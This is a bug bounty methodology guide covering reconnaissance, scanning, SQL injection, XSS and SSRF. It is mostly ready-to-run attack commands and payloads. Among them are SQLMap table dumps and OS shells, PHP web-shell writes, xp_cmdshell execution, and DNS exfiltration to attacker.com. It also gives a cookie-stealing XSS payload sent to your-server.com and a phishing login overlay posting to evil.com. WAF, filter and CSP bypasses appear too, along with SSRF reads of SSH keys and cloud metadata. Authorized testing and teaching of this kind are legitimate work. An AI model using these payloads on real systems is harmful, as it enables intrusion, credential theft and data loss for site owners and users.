---
title: Bug Bounty Methodology
description: Bug bounty hunting methodology with commands, techniques, payloads, bypass strategies, and structured attack workflows for professional hunters.
navigation:
  icon: i-lucide-bug
  title: Bug Bounty Methodology
---

## Reconnaissance

::badge
**Phase 1 — Intelligence Gathering**
::

Reconnaissance is the foundation of every successful bug bounty engagement. The more attack surface you uncover, the higher your chances of finding critical vulnerabilities.

::note
Always verify your scope before running any tools. Out-of-scope testing can result in permanent bans from bug bounty platforms.
::

### Subdomain Enumeration

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Passive Enumeration"}
  ```bash [Subfinder]
  # Fast passive subdomain discovery
  subfinder -d target.com -all -recursive -o subs_subfinder.txt

  # With multiple sources and API keys
  subfinder -d target.com -s shodan,censys,chaos,securitytrails,virustotal -o subs_passive.txt

  # Multi-domain enumeration
  subfinder -dL domains.txt -all -o all_subs.txt

  # Silent mode with unique output
  subfinder -d target.com -silent | sort -u | tee subs_clean.txt
  ```

  ```bash [Amass]
  # Passive enumeration with all sources
  amass enum -passive -d target.com -o subs_amass.txt

  # With brute force and alterations
  amass enum -active -brute -w /usr/share/wordlists/dns-all.txt -d target.com -o subs_amass_brute.txt

  # With ASN discovery
  amass intel -asn 12345 -o asn_domains.txt

  # Organization-based discovery
  amass intel -org "Target Corp" -o org_domains.txt
  ```

  ```bash [Chaos + SecurityTrails]
  # ProjectDiscovery Chaos
  chaos -d target.com -silent -o subs_chaos.txt

  # SecurityTrails API
  curl "https://api.securitytrails.com/v1/domain/target.com/subdomains" \
    -H "APIKEY: YOUR_API_KEY" | jq -r '.subdomains[]' | \
    sed "s/$/\.target.com/" > subs_sectrails.txt

  # CertSpotter
  curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | \
    jq -r '.[].dns_names[]' | sort -u > subs_certspotter.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Active Enumeration"}
  ```bash [DNS Brute Force]
  # Puredns with massdns resolver
  puredns bruteforce /usr/share/wordlists/best-dns-wordlist.txt target.com \
    -r resolvers.txt --wildcard-batch 100000 -w subs_brute.txt

  # Shuffledns brute force
  shuffledns -d target.com -w wordlist.txt -r resolvers.txt -o subs_shuffledns.txt

  # DNSx probing
  cat all_subs.txt | dnsx -silent -a -resp -o resolved_subs.txt

  # CNAME extraction for takeover
  cat all_subs.txt | dnsx -silent -cname -resp-only -o cnames.txt
  ```

  ```bash [Permutation & Mutation]
  # Gotator - Generate permutations
  gotator -sub subs_clean.txt -perm permutations.txt -depth 2 -numbers 3 -md | \
    sort -u > subs_permuted.txt

  # DNSGen + MassDNS
  cat subs_clean.txt | dnsgen - | massdns -r resolvers.txt -t A -o S -w resolved_permuted.txt

  # Altdns
  altdns -i subs_clean.txt -o altdns_output.txt -w words.txt -r -s resolved_altdns.txt

  # Regulator - Pattern-based discovery
  cat subs_clean.txt | python3 regulator.py target.com | sort -u > subs_patterns.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Combine & Resolve"}
  ```bash [Final Pipeline]
  # Merge all subdomain sources
  cat subs_subfinder.txt subs_amass.txt subs_chaos.txt \
    subs_brute.txt subs_permuted.txt subs_certspotter.txt | \
    sort -u > all_subs_merged.txt

  # Resolve and filter alive
  puredns resolve all_subs_merged.txt -r resolvers.txt -w resolved_final.txt

  # Probe for alive HTTP services
  cat resolved_final.txt | httpx -silent -status-code -title -tech-detect \
    -follow-redirects -mc 200,301,302,403,401,500 -o alive_hosts.txt

  # Extract unique IPs for port scanning
  cat resolved_final.txt | dnsx -silent -a -resp-only | sort -u > ips.txt

  echo "[+] Total subdomains: $(wc -l < resolved_final.txt)"
  echo "[+] Alive hosts: $(wc -l < alive_hosts.txt)"
  echo "[+] Unique IPs: $(wc -l < ips.txt)"
  ```
  :::
::

### Port Scanning & Service Discovery

::collapsible
---
label: "Complete Port Scanning Commands"
---

```bash [Nmap - Comprehensive]
# Fast SYN scan top 1000 ports
nmap -sS -T4 --top-ports 1000 -iL ips.txt -oA nmap_top1000

# Full port scan with service detection
nmap -sS -sV -sC -p- -T4 --min-rate 10000 -iL ips.txt -oA nmap_full

# UDP scan critical ports
nmap -sU -p 53,161,162,500,623,1900,5353,11211 -iL ips.txt -oA nmap_udp

# Vulnerability scan
nmap -sV --script=vuln -p 80,443,8080,8443 -iL ips.txt -oA nmap_vuln

# Script scan for specific services
nmap -sV --script=http-enum,http-headers,http-methods,http-title -p 80,443 -iL ips.txt -oA nmap_http

# OS detection with aggressive timing
nmap -sS -O -A -T4 --min-rate 5000 -iL ips.txt -oA nmap_os
```

```bash [Masscan - Speed]
# Fast full port scan
masscan -iL ips.txt -p 0-65535 --rate 10000 -oL masscan_output.txt

# Top ports with banner grabbing
masscan -iL ips.txt -p 80,443,8080,8443,8000,3000,5000,9090 --rate 5000 --banners -oL masscan_web.txt

# Parse masscan output to nmap
cat masscan_output.txt | awk '{print $4}' | sort -u > masscan_ips.txt
cat masscan_output.txt | awk '{print $3}' | sort -u | tr '\n' ',' > masscan_ports.txt
```

```bash [Naabu - ProjectDiscovery]
# Port scan with httpx integration
naabu -list resolved_final.txt -top-ports 1000 -silent | httpx -silent -o naabu_alive.txt

# Full port scan
naabu -list ips.txt -p - -rate 3000 -silent -o naabu_full.txt

# With service detection
naabu -list ips.txt -top-ports 100 -nmap-cli "nmap -sV" -o naabu_services.txt
```
::

### Technology Fingerprinting

```bash [Technology Detection]
# Wappalyzer via httpx
cat alive_hosts.txt | httpx -silent -tech-detect -json -o tech_detect.json

# WhatWeb
whatweb -i alive_hosts.txt --color=never --log-json=whatweb_output.json

# Webanalyze (Wappalyzer alternative)
webanalyze -hosts alive_hosts.txt -crawl 2 -output json > webanalyze_output.json

# Nuclei technology detection
nuclei -l alive_hosts.txt -tags tech -silent -o tech_nuclei.txt

# Retire.js for JavaScript libraries
retire --jspath /path/to/js/files --outputformat json --outputpath retire_output.json
```

### URL & Endpoint Discovery

::tabs
  :::tabs-item{icon="i-lucide-globe" label="Wayback & Archives"}
  ```bash [Historical URLs]
  # Waybackurls
  echo target.com | waybackurls | sort -u | tee wayback_urls.txt

  # GAU (GetAllUrls) - Multiple sources
  echo target.com | gau --threads 5 --subs --o gau_urls.txt

  # Waymore - Extended wayback
  python3 waymore.py -i target.com -mode U -oU waymore_urls.txt

  # Filter interesting extensions
  cat wayback_urls.txt gau_urls.txt | sort -u | \
    grep -iE "\.(php|asp|aspx|jsp|json|xml|config|env|sql|bak|old|backup|log|txt|yml|yaml|toml|ini|conf|cfg)$" | \
    tee interesting_files.txt

  # Filter parameters for injection testing
  cat wayback_urls.txt gau_urls.txt | sort -u | \
    grep "=" | qsreplace "FUZZ" | sort -u > params_urls.txt

  # Extract JavaScript files
  cat wayback_urls.txt gau_urls.txt | sort -u | \
    grep -iE "\.js(\?|$)" | sort -u > js_files.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Active Crawling"}
  ```bash [Web Crawlers]
  # Katana - ProjectDiscovery crawler
  katana -u https://target.com -d 5 -jc -kf all -aff \
    -ef css,png,jpg,gif,svg,woff,ttf -o katana_urls.txt

  # Katana with headless mode
  katana -u https://target.com -d 5 -jc -headless -no-sandbox \
    -known-files all -o katana_headless.txt

  # Hakrawler
  echo https://target.com | hakrawler -d 3 -insecure | tee hakrawler_urls.txt

  # Gospider
  gospider -s https://target.com -c 10 -d 3 --other-source \
    --include-subs -o gospider_output/

  # ParamSpider - Parameter discovery
  paramspider -d target.com --exclude woff,css,js,png,svg,jpg \
    -o paramspider_output.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="JavaScript Analysis"}
  ```bash [JS Recon]
  # Download all JS files
  cat js_files.txt | xargs -I{} wget {} -P js_downloaded/ 2>/dev/null

  # LinkFinder - Extract endpoints from JS
  python3 linkfinder.py -i https://target.com -d -o linkfinder_output.html

  # SecretFinder - Secrets in JS
  python3 SecretFinder.py -i https://target.com -e -o secretfinder_output.html

  # JSScanner pipeline
  cat js_files.txt | while read url; do
    python3 linkfinder.py -i "$url" -o cli
  done | sort -u > js_endpoints.txt

  # Mantra - Secret patterns in JS
  cat js_files.txt | mantra -s | tee js_secrets.txt

  # Nuclei JS exposure checks
  nuclei -l js_files.txt -tags exposure,token -silent -o js_nuclei.txt

  # Extract API keys regex
  cat js_downloaded/* | grep -oP "(api[_-]?key|api[_-]?secret|token|authorization|bearer|password|secret)['\"\s:=]+['\"][a-zA-Z0-9_\-]{16,}['\"]" | sort -u > api_keys.txt
  ```
  :::
::

### Content & Directory Discovery

::code-group
```bash [Feroxbuster]
# Recursive directory brute force
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,asp,aspx,jsp,html,js,json,xml,txt,bak,old,conf -t 50 -d 3 --silent -o ferox_output.txt

# With extensions and status code filtering
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html,js -C 404,403 -t 100 --smart -o ferox_filtered.txt

# Resume scan
feroxbuster -u https://target.com --resume-from ferox_state.json

# With headers and cookies
feroxbuster -u https://target.com -w wordlist.txt \
  -H "Authorization: Bearer TOKEN" -b "session=abc123" -t 50
```

```bash [Dirsearch]
# Standard scan
dirsearch -u https://target.com -e php,asp,aspx,jsp,html,js,json,bak -t 50 -r -R 3

# With wordlist and exclusions
dirsearch -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -e php,txt -x 404,403,500 --random-agent

# Multiple targets
dirsearch -l alive_hosts.txt -e php,html,js -t 30 --format json -o dirsearch_output.json
```

```bash [Gobuster]
# Directory mode
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -x php,html,js,txt -t 50 -o gobuster_dir.txt

# VHOST discovery
gobuster vhost -u https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 --append-domain -o gobuster_vhost.txt

# DNS mode
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -t 50 -o gobuster_dns.txt

# Fuzzing mode
gobuster fuzz -u https://target.com/FUZZ -w wordlist.txt -t 50 --exclude-length 0
```

```bash [ffuf]
# Directory fuzzing
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,301,302,401,403,405,500 -t 100 -o ffuf_dir.json -of json

# File extension fuzzing
ffuf -u https://target.com/admin.FUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt \
  -mc 200 -t 50

# Recursive with auto-calibration
ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3 -ac -t 100

# POST data fuzzing
ffuf -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -mc 302 -t 50
```
::

---

## Vulnerability Scanning

::badge
**Phase 2 — Automated Discovery**
::

### Nuclei Scanning Workflows

::tabs
  :::tabs-item{icon="i-lucide-zap" label="Standard Scans"}
  ```bash [Nuclei Commands]
  # Full template scan
  nuclei -l alive_hosts.txt -t nuclei-templates/ -severity critical,high,medium \
    -c 50 -bulk-size 50 -rate-limit 150 -o nuclei_results.txt

  # Critical and High only
  nuclei -l alive_hosts.txt -severity critical,high -silent -o nuclei_critical.txt

  # Specific vulnerability categories
  nuclei -l alive_hosts.txt -tags cve -severity critical,high -o nuclei_cve.txt
  nuclei -l alive_hosts.txt -tags sqli -o nuclei_sqli.txt
  nuclei -l alive_hosts.txt -tags xss -o nuclei_xss.txt
  nuclei -l alive_hosts.txt -tags ssrf -o nuclei_ssrf.txt
  nuclei -l alive_hosts.txt -tags lfi,rfi -o nuclei_fileinclude.txt
  nuclei -l alive_hosts.txt -tags rce -o nuclei_rce.txt

  # Exposed panels and technologies
  nuclei -l alive_hosts.txt -tags panel,login,dashboard -o nuclei_panels.txt
  nuclei -l alive_hosts.txt -tags exposure,config,backup -o nuclei_exposure.txt
  nuclei -l alive_hosts.txt -tags token,api -o nuclei_tokens.txt

  # Scan with custom headers
  nuclei -l alive_hosts.txt -tags cve -H "Authorization: Bearer TOKEN" -o nuclei_auth.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Targeted Scans"}
  ```bash [Specific Checks]
  # Subdomain takeover
  nuclei -l resolved_final.txt -tags takeover -o nuclei_takeover.txt

  # CORS misconfiguration
  nuclei -l alive_hosts.txt -tags cors -o nuclei_cors.txt

  # Open redirect
  nuclei -l alive_hosts.txt -tags redirect -o nuclei_redirect.txt

  # SSTI
  nuclei -l alive_hosts.txt -tags ssti -o nuclei_ssti.txt

  # CRLF injection
  nuclei -l alive_hosts.txt -tags crlf -o nuclei_crlf.txt

  # Default credentials
  nuclei -l alive_hosts.txt -tags default-login -o nuclei_defaults.txt

  # Misconfigurations
  nuclei -l alive_hosts.txt -tags misconfig -o nuclei_misconfig.txt

  # CVE-specific scanning
  nuclei -l alive_hosts.txt -tags cve2024,cve2023 -severity critical -o nuclei_recent_cve.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Custom Templates"}
  ```yaml [custom-header-injection.yaml]
  id: custom-header-injection
  info:
    name: Custom Header Injection Check
    author: hunter
    severity: medium
    tags: header-injection,custom
  
  http:
    - method: GET
      path:
        - "{{BaseURL}}"
      headers:
        X-Forwarded-Host: evil.com
        X-Forwarded-For: 127.0.0.1
        X-Original-URL: /admin
        X-Rewrite-URL: /admin
      matchers-condition: or
      matchers:
        - type: word
          words:
            - "evil.com"
          part: response
        - type: status
          status:
            - 200
            - 302
  ```

  ```bash [Run Custom Templates]
  # Run custom template
  nuclei -l alive_hosts.txt -t ./custom-templates/ -o nuclei_custom.txt

  # Validate template
  nuclei -validate -t ./custom-templates/

  # Run with workflow
  nuclei -l alive_hosts.txt -w ./workflows/comprehensive.yaml -o nuclei_workflow.txt
  ```
  :::
::

---

## Injection Attacks

::badge
**Phase 3 — Manual Exploitation**
::

### SQL Injection (SQLi)

::warning
SQL Injection remains one of the most critical vulnerability classes. Always test with the minimum impact necessary and avoid destructive queries on production systems.
::

::accordion
  :::accordion-item{icon="i-lucide-database" label="Detection & Identification"}
  ```bash [SQLMap - Automated Detection]
  # Basic detection
  sqlmap -u "https://target.com/page?id=1" --batch --level 3 --risk 2

  # POST request
  sqlmap -u "https://target.com/login" --data="username=admin&password=test" \
    --batch --level 3 --risk 2

  # With cookie authentication
  sqlmap -u "https://target.com/api/user?id=1" \
    --cookie="session=abc123" --batch --level 5 --risk 3

  # Request from file (Burp saved request)
  sqlmap -r request.txt --batch --level 3 --risk 2

  # Specific parameter testing
  sqlmap -u "https://target.com/search?q=test&category=1" \
    -p "category" --batch --level 3 --risk 2

  # Through proxy
  sqlmap -u "https://target.com/page?id=1" --proxy="http://127.0.0.1:8080" --batch

  # WAF bypass tamper scripts
  sqlmap -u "https://target.com/page?id=1" --batch \
    --tamper="between,randomcase,space2comment,charencode,equaltolike"
  ```

  **Manual Detection Payloads:**

  | Payload | Purpose |
  | ------- | ------- |
  | `'` | Basic string break |
  | `"` | Double quote break |
  | `' OR 1=1--` | Boolean-based authentication bypass |
  | `' OR '1'='1` | String-based boolean |
  | `1 AND 1=1` | Numeric boolean true |
  | `1 AND 1=2` | Numeric boolean false |
  | `' UNION SELECT NULL--` | Union-based column detection |
  | `1; WAITFOR DELAY '0:0:5'--` | Time-based blind (MSSQL) |
  | `1' AND SLEEP(5)--` | Time-based blind (MySQL) |
  | `1' AND pg_sleep(5)--` | Time-based blind (PostgreSQL) |
  | `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--` | Error-based (MySQL) |
  :::

  :::accordion-item{icon="i-lucide-database" label="Exploitation & Data Extraction"}
  ```bash [SQLMap - Extraction]
  # Enumerate databases
  sqlmap -u "https://target.com/page?id=1" --dbs --batch

  # Enumerate tables
  sqlmap -u "https://target.com/page?id=1" -D database_name --tables --batch

  # Dump specific table
  sqlmap -u "https://target.com/page?id=1" -D database_name -T users --dump --batch

  # Dump specific columns
  sqlmap -u "https://target.com/page?id=1" -D database_name -T users \
    -C username,password --dump --batch

  # OS Shell (if DBA privileges)
  sqlmap -u "https://target.com/page?id=1" --os-shell --batch

  # SQL Shell
  sqlmap -u "https://target.com/page?id=1" --sql-shell --batch

  # File read
  sqlmap -u "https://target.com/page?id=1" --file-read="/etc/passwd" --batch

  # File write
  sqlmap -u "https://target.com/page?id=1" \
    --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

  # Specific technique
  sqlmap -u "https://target.com/page?id=1" --technique=BT --batch
  # B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
  ```
  :::

  :::accordion-item{icon="i-lucide-database" label="WAF Bypass Techniques"}
  **Bypass Payloads:**

  ```sql [Inline Comments]
  /*!50000UNION*//*!50000SELECT*/1,2,3--
  1'/*!50000AND*/1=1--
  ```

  ```sql [Case Variation]
  1' uNiOn SeLeCt 1,2,3--
  1' UnIoN/**/sElEcT 1,2,3--
  ```

  ```sql [Encoding]
  1%27%20UNION%20SELECT%201,2,3--
  1' UNION SELECT CHAR(49),CHAR(50),CHAR(51)--
  ```

  ```sql [Whitespace Alternatives]
  1'/**/UNION/**/SELECT/**/1,2,3--
  1'%09UNION%09SELECT%091,2,3--
  1'%0aUNION%0aSELECT%0a1,2,3--
  ```

  ```sql [Double Encoding]
  1%2527%2520UNION%2520SELECT%25201,2,3--
  ```

  ```sql [Scientific Notation]
  0e0UNION+SELECT+1,2,3--
  1'and+1e0=1e0+UNION+SELECT+1,2,3--
  ```

  ```bash [SQLMap Tamper Chains]
  # Heavy WAF bypass
  sqlmap -u "https://target.com/page?id=1" --batch \
    --tamper="between,charencode,charunicodeencode,equaltolike,greatest,\
    multiplespaces,nonrecursivereplacement,percentage,randomcase,\
    securesphere,space2comment,space2plus,space2randomblank,\
    unionalltounion,unmagicquotes"

  # Cloudflare bypass
  sqlmap -u "https://target.com/page?id=1" --batch \
    --tamper="between,randomcase,space2comment" \
    --random-agent --delay=2

  # ModSecurity bypass
  sqlmap -u "https://target.com/page?id=1" --batch \
    --tamper="modsecurityversioned,modsecurityzeroversioned,\
    space2comment,charencode"
  ```
  :::

  :::accordion-item{icon="i-lucide-database" label="Database-Specific Payloads"}
  | Database | Version | Current User | Databases |
  | -------- | ------- | ------------ | --------- |
  | MySQL | `SELECT @@version` | `SELECT user()` | `SELECT schema_name FROM information_schema.schemata` |
  | PostgreSQL | `SELECT version()` | `SELECT current_user` | `SELECT datname FROM pg_database` |
  | MSSQL | `SELECT @@version` | `SELECT SYSTEM_USER` | `SELECT name FROM sys.databases` |
  | Oracle | `SELECT banner FROM v$version` | `SELECT user FROM dual` | `SELECT DISTINCT owner FROM all_tables` |
  | SQLite | `SELECT sqlite_version()` | N/A | `.tables` |

  ```sql [MySQL Specific]
  -- Read file
  ' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
  
  -- Write file
  ' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 INTO OUTFILE '/var/www/html/shell.php'--
  
  -- DNS exfiltration
  ' AND (SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\share')))--
  ```

  ```sql [PostgreSQL Specific]
  -- Read file
  ' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL--
  
  -- Command execution
  '; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
  
  -- Large object RCE
  '; SELECT lo_import('/etc/passwd'); --
  ```

  ```sql [MSSQL Specific]
  -- Enable xp_cmdshell
  '; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
  '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
  
  -- Command execution
  '; EXEC xp_cmdshell 'whoami';--
  
  -- DNS exfiltration
  '; DECLARE @a varchar(1024); SET @a=SYSTEM_USER; EXEC('master..xp_dirtree "\\'+@a+'.attacker.com\share"');--
  ```
  :::
::

### Cross-Site Scripting (XSS)

::accordion
  :::accordion-item{icon="i-lucide-code" label="Reflected XSS Hunting"}
  ```bash [Automated Scanning]
  # Dalfox - XSS scanner
  cat params_urls.txt | dalfox pipe -b https://your-callback.xss.ht \
    --silence --only-poc -o dalfox_results.txt

  # Dalfox with custom payloads
  dalfox url "https://target.com/search?q=FUZZ" \
    --custom-payload xss_payloads.txt -b https://your-callback.xss.ht

  # XSStrike
  python3 xsstrike.py -u "https://target.com/search?q=test" --crawl -l 3

  # KXSS - Parameter reflection check
  cat params_urls.txt | kxss | tee kxss_reflected.txt

  # Mass reflection testing
  cat params_urls.txt | qsreplace '"><img src=x onerror=alert(1)>' | \
    httpx -silent -mc 200 -mr '"><img src=x onerror=alert(1)>' -o reflected_xss.txt
  ```

  **Context-Specific Payloads:**

  | Context | Payload |
  | ------- | ------- |
  | HTML body | `<script>alert(document.domain)</script>` |
  | HTML attribute | `" onmouseover="alert(1)` |
  | JavaScript string | `'-alert(1)-'` |
  | JavaScript template | `${alert(document.domain)}` |
  | URL context | `javascript:alert(1)` |
  | Inside `<script>` | `</script><script>alert(1)</script>` |
  | SVG context | `<svg onload=alert(1)>` |
  | MathML | `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>` |
  :::

  :::accordion-item{icon="i-lucide-code" label="Stored XSS Hunting"}
  **Common Injection Points:**

  - User profile fields (name, bio, website, location)
  - Comments and reviews
  - Forum posts and messages
  - File upload names
  - Email headers (From, Subject)
  - Support tickets
  - Webhook URLs and callback fields
  - Custom HTTP headers logged in dashboards
  - Markdown/Rich text editors
  - SVG file uploads
  - CSV injection in exports

  ```html [Stored XSS Payloads]
  <!-- Profile fields -->
  <img src=x onerror=fetch('https://your-server.com/steal?c='+document.cookie)>

  <!-- Markdown injection -->
  [click me](javascript:alert(document.domain))
  ![img](x" onerror="alert(1))

  <!-- SVG file upload -->
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <text x="10" y="20">XSS</text>
  </svg>

  <!-- HTML injection in email -->
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h1>Session Expired</h1>
  <form action="https://evil.com/phish">
  <input name="user" placeholder="Username">
  <input name="pass" type="password" placeholder="Password">
  <button>Login</button></form></div>
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Filter Bypass Techniques"}
  ```html [Case & Encoding]
  <!-- Case variation -->
  <ScRiPt>alert(1)</ScRiPt>
  <IMG SRC=x OnErRoR=alert(1)>

  <!-- HTML entities -->
  <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

  <!-- URL encoding -->
  <img src=x onerror=%61lert(1)>

  <!-- Double encoding -->
  %253Cscript%253Ealert(1)%253C%252Fscript%253E

  <!-- Unicode -->
  <script>\u0061lert(1)</script>

  <!-- Null bytes -->
  <scr%00ipt>alert(1)</scr%00ipt>
  ```

  ```html [Tag & Event Bypass]
  <!-- Without parentheses -->
  <img src=x onerror=alert`1`>
  <img src=x onerror=throw/a]/.source+self["ale"+"rt"]\(1\)>

  <!-- Without alert -->
  <img src=x onerror=confirm(1)>
  <img src=x onerror=prompt(1)>
  <img src=x onerror=print()>
  <img src=x onerror=window['al'+'ert'](1)>
  <img src=x onerror=self[atob('YWxlcnQ=')](1)>
  <img src=x onerror=top[8680439..toString(30)](1)>

  <!-- Without angle brackets -->
  " autofocus onfocus="alert(1)
  " onmouseover="alert(1)" style="position:fixed;width:100%;height:100%;top:0;left:0;

  <!-- Exotic tags -->
  <details open ontoggle=alert(1)>
  <marquee onstart=alert(1)>
  <video><source onerror=alert(1)>
  <audio src=x onerror=alert(1)>
  <input onfocus=alert(1) autofocus>
  <body onload=alert(1)>
  <iframe srcdoc="<script>alert(1)</script>">
  <object data="javascript:alert(1)">
  <embed src="javascript:alert(1)">
  ```

  ```html [CSP Bypass]
  <!-- JSONP callback abuse -->
  <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

  <!-- Angular.js CSP bypass -->
  <div ng-app ng-csp>
    {{$eval.constructor('alert(1)')()}}
  </div>

  <!-- Base tag injection -->
  <base href="https://evil.com/">

  <!-- Meta redirect -->
  <meta http-equiv="refresh" content="0;url=javascript:alert(1)">

  <!-- Via allowed CDN -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
  <div ng-app>{{constructor.constructor('alert(1)')()}}</div>
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="DOM-Based XSS"}
  ```javascript [DOM XSS Sources & Sinks]
  // Common Sources (user-controllable input)
  document.URL
  document.documentURI
  document.referrer
  location.href
  location.search
  location.hash
  window.name
  document.cookie
  postMessage data

  // Common Sinks (dangerous execution points)
  document.write()
  document.writeln()
  element.innerHTML
  element.outerHTML
  element.insertAdjacentHTML()
  eval()
  setTimeout()
  setInterval()
  Function()
  location.href
  location.assign()
  location.replace()
  jQuery.html()
  $.html()
  ```

  ```bash [DOM XSS Discovery]
  # Scan for DOM XSS with Nuclei
  nuclei -l alive_hosts.txt -tags dom-xss -o dom_xss_nuclei.txt

  # DOM Invader (Burp Suite Extension) - Manual
  # 1. Enable DOM Invader in Burp's embedded browser
  # 2. Inject canary into all sources
  # 3. Check if canary reaches sinks

  # Grep for dangerous patterns in JS files
  cat js_downloaded/* | grep -oP "(document\.write|innerHTML|outerHTML|eval|setTimeout|setInterval|Function)\s*\(" | sort | uniq -c | sort -rn

  # Check for postMessage vulnerabilities
  cat js_downloaded/* | grep -oP "addEventListener\s*\(\s*['\"]message['\"]" | head -20
  ```
  :::
::

### Server-Side Request Forgery (SSRF)

::tabs
  :::tabs-item{icon="i-lucide-globe" label="Basic SSRF"}
  ```bash [SSRF Testing]
  # Common SSRF parameters
  # url=, uri=, path=, dest=, redirect=, src=, source=, domain=
  # imageURL=, iconURL=, return=, returnTo=, go=, out=, view=
  # callback=, feed=, host=, site=, html=, data=, load=, request=

  # Test with Burp Collaborator / interactsh
  interactsh-client -v

  # Basic SSRF payloads
  curl "https://target.com/fetch?url=http://COLLABORATOR.oast.fun"
  curl "https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/"
  curl "https://target.com/load?url=http://127.0.0.1:8080/admin"

  # File protocol
  curl "https://target.com/fetch?url=file:///etc/passwd"
  curl "https://target.com/fetch?url=file:///proc/self/environ"
  curl "https://target.com/fetch?url=file:///home/user/.ssh/id_rsa"
  ```

  **Cloud Metadata Endpoints:**

  | Provider | Endpoint |
  | -------- | -------- |
  | AWS | `http://169.254.169.254/latest/meta-data/` |
  | AWS IMDSv2 | `TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")` then `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/` |
  | GCP | `http://metadata.google.internal/computeMetadata/v1/` with header `Metadata-Flavor: Google` |
  | Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with header `Metadata: true` |
  | DigitalOcean | `http://169.254.169.254/metadata/v1/` |
  | Alibaba | `http://100.100.100.200/latest/meta-data/` |
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="SSRF Bypass Techniques"}
  ```text [IP Address Bypass]
  # Localhost alternatives
  http://127.0.0.1
  http://localhost
  http://0.0.0.0
  http://0
  http://[::1]
  http://[0000::1]
  http://127.1
  http://127.0.1
  http://2130706433        # Decimal
  http://0x7f000001        # Hex
  http://017700000001      # Octal
  http://0177.0.0.1        # Octal dots
  http://①②⑦.⓪.⓪.①      # Unicode

  # DNS rebinding
  http://spoofed.burpcollaborator.net  # Resolves to 127.0.0.1
  http://1ynrnhl.xip.io               # Points to 127.0.0.1
  http://127.0.0.1.nip.io

  # URL parsing confusion
  http://evil.com@127.0.0.1
  http://127.0.0.1#@evil.com
  http://127.0.0.1%2523@evil.com
  http://evil.com\@127.0.0.1

  # Protocol smuggling
  gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
  dict://127.0.0.1:6379/info
  ```

  ```bash [Redirect-Based SSRF]
  # Create redirect on your server
  # redirect.php: <?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>

  curl "https://target.com/fetch?url=https://your-server.com/redirect.php"

  # Using URL shorteners
  curl "https://target.com/fetch?url=https://tinyurl.com/YOUR_SHORT_URL"

  # Double URL encoding
  curl "https://target.com/fetch?url=http%253A%252F%252F169.254.169.254%252Flatest%252Fmeta-data%252F"

  # CRLF injection in SSRF
  curl "https://target.com/fetch?url=http://evil.com%0d%0aHost:%20169.254.169.254"
  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="Blind SSRF"}
  ```bash [Blind SSRF Detection]
  # Using interactsh
  interactsh-client -v 2>&1 &
  CALLBACK="YOUR_INTERACTSH_URL"

  # Inject in all parameters
  cat params_urls.txt | qsreplace "http://$CALLBACK" | \
    httpx -silent -mc 200,301,302 -o ssrf_test.txt

  # Header-based SSRF
  curl -s "https://target.com/" \
    -H "X-Forwarded-For: http://$CALLBACK" \
    -H "Referer: http://$CALLBACK" \
    -H "X-Original-URL: http://$CALLBACK" \
    -H "X-Custom-IP-Authorization: http://$CALLBACK"

  # Webhook SSRF
  curl -X POST "https://target.com/api/webhooks" \
    -H "Content-Type: application/json" \
    -d '{"url":"http://'"$CALLBACK"'","event":"test"}'

  # File upload SSRF (SVG)
  echo '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://'"$CALLBACK"'/ssrf"/>
  </svg>' > ssrf.svg

